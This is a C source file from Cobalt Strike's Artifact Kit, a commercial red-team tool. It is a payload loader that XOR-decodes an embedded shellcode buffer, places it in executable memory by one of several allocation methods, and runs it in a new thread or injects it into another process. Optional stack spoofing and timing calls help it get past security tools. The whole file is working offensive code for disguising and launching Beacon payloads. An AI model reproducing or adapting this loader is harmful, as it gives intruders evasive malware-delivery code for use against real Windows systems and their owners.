/*
 * Artifact Kit - A means to disguise and inject our payloads... *pHEAR*
 * (c) 2022 HelpSystems LLC
 *
 */

#include <windows.h>
#include <stdio.h>
#include "patch.h"

char data[sizeof(phear)] = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";

void set_key_pointers(void *buffer)
{
   phear *payload = (phear *)data;

   /* this payload does not adhere to our protocol to pass GetModuleHandleA / GetProcAddress to
      the payload directly. */
   if (payload->gmh_offset <= 0 || payload->gpa_offset <= 0)
      return;

   void *gpa_addr = (void *)GetProcAddress;
   void *gmh_addr = (void *)GetModuleHandleA;

   memcpy(buffer + payload->gmh_offset, &gmh_addr, sizeof(void *));
   memcpy(buffer + payload->gpa_offset, &gpa_addr, sizeof(void *));
}

#ifdef _MIGRATE_
#include "start_thread.c"
#include "injector.c"
void spawn(void *buffer, int length, char *key)
{
   char process[64] = "MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM";
   int x;

   /* decode the process name with the key (valid name, \0, junk to fill 64) */
   for (int x = 0; x < sizeof(process); x++)
   {
      *((char *)process + x) = *((char *)process + x) ^ key[x % 8]; // 8 byte XoR;
   }
   for (int x = 0; x < sizeof(process); x++)
   {
      char *ptr1;
      ptr1 = (char *)buffer + x;
      GetTickCount();
      *ptr1 = *ptr1 ^ key[x % 8];
   }

   for (x = 0; x < length; x++)
   {
      char *ptr2;

      ptr2 = (char *)buffer + x;

      GetTickCount();

      *ptr2 = *ptr2 ^ key[x % 8];
   }

   /* propagate our key function pointers to our payload */
   set_key_pointers(buffer);

   inject(buffer, length, process);
}
#else

#if STACK_SPOOF == 1
#include "spoof.c"
#endif

void run(void *buffer)
{
   void (*function)();
   function = (void (*)())buffer;
#if STACK_SPOOF == 1
   beacon_threadid = GetCurrentThreadId();
#endif
   function();
}

void spawn(void *buffer, int length, char *key)
{
   void *ptr;

   /* This memory allocation will be released by beacon for these conditions:.
    *    1. The stage.cleanup is set to true
    *    2. The reflective loader passes the address of the loader into DllMain.
    *
    * This is true for the built-in Cobalt Strike reflective loader and the example
    * user defined reflective loader (UDRL) in the Arsenal Kit.
    */
#if USE_HeapAlloc
   /* Create Heap */
   HANDLE heap;
   heap = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);

   /* allocate the memory for our decoded payload */
   ptr = HeapAlloc(heap, 0, 10);

   /* Get wacky and add a bit of of HeapReAlloc */
   if (length > 0)
   {
      ptr = HeapReAlloc(heap, 0, ptr, length);
   }

#elif USE_VirtualAlloc
   ptr = VirtualAlloc(0, length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

#elif USE_MapViewOfFile
   HANDLE hFile = CreateFileMappingA(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0, length, NULL);
   ptr = MapViewOfFile(hFile, FILE_MAP_ALL_ACCESS | FILE_MAP_EXECUTE, 0, 0, 0);
   CloseHandle(hFile);

#endif

   /* decode the payload with the key */
   for (int x = 0; x < length; x++)
   {
      char *ptr3;
      ptr3 = (char *)ptr + x;
      GetTickCount();
      char *ptr4;
      ptr4 = (char *)buffer + x;
      GetTickCount();
      *ptr3 = *ptr4 ^ key[x % 8];
   }

#if STACK_SPOOF == 1
   /* setup stack spoofing */
   set_stack_spoof_code();
#endif

   /* propagate our key function pointers to our payload */
   set_key_pointers(ptr);

#if defined(USE_VirtualAlloc) || defined(USE_MapViewOfFile)
   /* fix memory protection */
   DWORD old;
   VirtualProtect(ptr, length, PAGE_EXECUTE_READ, &old);
#endif

   /* spawn a thread with our data */
   CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&run, ptr, 0, NULL);
}
#endif
